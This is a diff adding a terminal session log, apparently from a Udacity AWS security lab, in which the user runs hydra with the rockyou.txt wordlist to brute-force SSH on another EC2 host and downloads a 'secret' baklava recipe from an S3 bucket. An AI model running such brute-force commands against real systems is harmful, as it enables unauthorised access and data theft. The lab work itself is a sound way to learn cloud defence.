@@ -1,0 +1,158 @@
+Authenticating with public key "Imported-Openssh-Key: C:\\Users\\mohamed.mekawy\\Desktop\\Data\\Udacity\\EgFwdAWSArch\\P3\\create-stack-key.pem"
+    ┌──────────────────────────────────────────────────────────────────────┐
+    │                 • MobaXterm Personal Edition v21.2 •                 │
+    │               (SSH client, X server and network tools)               │
+    │                                                                      │
+    │ ➤ SSH session to ubuntu@ec2-52-205-252-51.compute-1.amazonaws.com          │
+    │   • Direct SSH      :  ✔                                             │
+    │   • SSH compression :  ✔                                             │
+    │   • SSH-browser     :  ✔                                             │
+    │   • X11-forwarding  :  ✔  (remote display is forwarded through SSH)  │
+    │                                                                      │
+    │ ➤ For more info, ctrl+click on help or visit our website.            │
+    └──────────────────────────────────────────────────────────────────────┘
+
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-1084-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep 10 22:25:20 UTC 2022
+
+  System load:  0.0               Processes:           99
+  Usage of /:   34.0% of 7.68GB   Users logged in:     0
+  Memory usage: 19%               IP address for ens5: 10.192.11.47
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+160 packages can be updated.
+22 updates are security updates.
+
+
+Last login: Tue Feb  4 21:14:45 2020 from 73.22.214.244
+/usr/bin/xauth:  file /home/ubuntu/.Xauthority does not exist
+ubuntu@ip-10-192-11-47:~$ date
+Sat Sep 10 22:27:04 UTC 2022
+ubuntu@ip-10-192-11-47:~$ ll
+total 136712
+drwxr-xr-x 5 ubuntu ubuntu      4096 Sep 10 22:25 ./
+drwxr-xr-x 3 root   root        4096 Dec 17  2019 ../
+-rw------- 1 ubuntu ubuntu        61 Sep 10 22:25 .Xauthority
+-rw------- 1 ubuntu ubuntu      4500 Feb  4  2020 .bash_history
+-rw-r--r-- 1 ubuntu ubuntu       220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu      3771 Apr  4  2018 .bashrc
+drwx------ 2 ubuntu ubuntu      4096 Dec 17  2019 .cache/
+drwx------ 3 ubuntu ubuntu      4096 Dec 17  2019 .gnupg/
+-rw------- 1 ubuntu ubuntu        35 Dec 17  2019 .lesshst
+-rw-r--r-- 1 ubuntu ubuntu       807 Apr  4  2018 .profile
+-rw------- 1 ubuntu ubuntu         7 Dec 17  2019 .python_history
+drwx------ 2 ubuntu ubuntu      4096 Dec 17  2019 .ssh/
+-rw-r--r-- 1 ubuntu ubuntu         0 Dec 17  2019 .sudo_as_admin_successful
+-rw------- 1 ubuntu ubuntu      9575 Feb  4  2020 .viminfo
+-rw-rw-r-- 1 ubuntu ubuntu       165 Feb  4  2020 .wget-hsts
+-rw-rw-r-- 1 ubuntu ubuntu 139921543 Feb  4  2020 rockyou.txt
+ubuntu@ip-10-192-11-47:~$ hydra -l ubuntu -P rockyou.txt ssh://ec2-35-170-255-32.compute-1.amazonaws.com
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-10 22:28:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ssh://ec2-35-170-255-32.compute-1.amazonaws.com:22/
+[STATUS] 259.00 tries/min, 259 tries in 00:01h, 14344144 to do in 923:03h, 16 active
+[STATUS] 247.33 tries/min, 742 tries in 00:03h, 14343664 to do in 966:34h, 16 active
+[STATUS] 243.43 tries/min, 1704 tries in 00:07h, 14342704 to do in 981:60h, 16 active
+[STATUS] 241.60 tries/min, 3624 tries in 00:15h, 14340784 to do in 989:18h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ubuntu@ip-10-192-11-47:~$ aws s3 ls s3://cand-c3-secret-recipes-230626268602/ --region us-east-1
+2022-09-10 19:44:09       1580 secret_recipe.txt
+ubuntu@ip-10-192-11-47:~$ aws s3 cp s3://cand-c3-secret-recipes-230626268602/secret_recipe.txt . --region us-east-1
+download: s3://cand-c3-secret-recipes-230626268602/secret_recipe.txt to ./secret_recipe.txt
+ubuntu@ip-10-192-11-47:~$ ll
+total 287380
+drwxr-xr-x 5 ubuntu ubuntu      4096 Sep 10 22:56 ./
+drwxr-xr-x 3 root   root        4096 Dec 17  2019 ../
+-rw------- 1 ubuntu ubuntu        61 Sep 10 22:25 .Xauthority
+-rw------- 1 ubuntu ubuntu      4500 Feb  4  2020 .bash_history
+-rw-r--r-- 1 ubuntu ubuntu       220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu      3771 Apr  4  2018 .bashrc
+drwx------ 2 ubuntu ubuntu      4096 Dec 17  2019 .cache/
+drwx------ 3 ubuntu ubuntu      4096 Dec 17  2019 .gnupg/
+-rw------- 1 ubuntu ubuntu        35 Dec 17  2019 .lesshst
+-rw-r--r-- 1 ubuntu ubuntu       807 Apr  4  2018 .profile
+-rw------- 1 ubuntu ubuntu         7 Dec 17  2019 .python_history
+drwx------ 2 ubuntu ubuntu      4096 Dec 17  2019 .ssh/
+-rw-r--r-- 1 ubuntu ubuntu         0 Dec 17  2019 .sudo_as_admin_successful
+-rw------- 1 ubuntu ubuntu      9575 Feb  4  2020 .viminfo
+-rw-rw-r-- 1 ubuntu ubuntu       165 Feb  4  2020 .wget-hsts
+-rw-rw-r-- 1 ubuntu ubuntu 154276150 Sep 10 22:55 hydra.restore
+-rw-rw-r-- 1 ubuntu ubuntu 139921543 Feb  4  2020 rockyou.txt
+-rw-rw-r-- 1 ubuntu ubuntu      1580 Sep 10 19:44 secret_recipe.txt
+ubuntu@ip-10-192-11-47:~$ cat secret_recipe.txt
+Baklava
+Category: Desserts:  Cake, cookies, mousse, puddings, etc..
+Classification:     Paid, Secret
+Quantity: (makes about 100 2 1/2 inch long diamonds)
+
+Ingredients:
+Simmer a syrup of:              1/2 cup sugar or honey
+  3/4 cup water                 1/2 lemon
+until it is thick enough to
+coat the back of a spoon.
+Remove the lemon.  Add:         1 Tbsp. orange-blossom
+                              water
+and simmer a few minutes
+longer.  Cool and
+refrigerate.
+Prepare a filling of:           1 1/2 cups coarsely
+                              chopped nuts: almonds,
+                              pistachios and walnuts in
+                              any proportion
+
+sprinkle the nuts with a        2 Tbsp. sugar
+mixture of:
+  1 tsp. cinnamon               1/8 tsp. cloves
+Melt
+  1 cup sweet butter          Have ready 24 sheets phyllo
+                              dough (1 lb.)
+
+
+Instructions:
+Layer 12 of them on an 11 x 15 inch buttered baklava pan,
+brushing the sheets of dough with about half the butter.
+Spread the filling on top and cover with the remaining 12
+similarly buttered sheets. Preheat oven to 350 F. Cut the
+top layered sheets and filling diagonally into 2 inch long
+diamonds, but leave the bottom few layers uncut.  Bake about
+30 minutes.  Raise oven temperature to 475 F. and bake about
+15 minutes longer or until golden.  Remove from oven.  Pour
+the refrigerated syrup over the top of puffed dough. Cut,
+using the same diagonals, through the uncut layer of dough
+and serve the diamond-shaped slices when cooled.
+ubuntu@ip-10-192-11-47:~$ hydra -l ubuntu -P rockyou.txt -t 4 ssh://ec2-35-170-255-32.compute-1.amazonaws.com
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-10 22:59:41
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
+[DATA] attacking ssh://ec2-35-170-255-32.compute-1.amazonaws.com:22/
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344336 to do in 3735:31h, 4 active
+[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344216 to do in 3897:54h, 4 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ubuntu@ip-10-192-11-47:~$ hydra -R
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[INFORMATION] reading restore file ./hydra.restore
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-10 23:04:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
+[DATA] attacking ssh://ec2-35-170-255-32.compute-1.amazonaws.com:22/
+[STATUS] 351.00 tries/min, 351 tries in 00:01h, 14344049 to do in 681:07h, 4 active
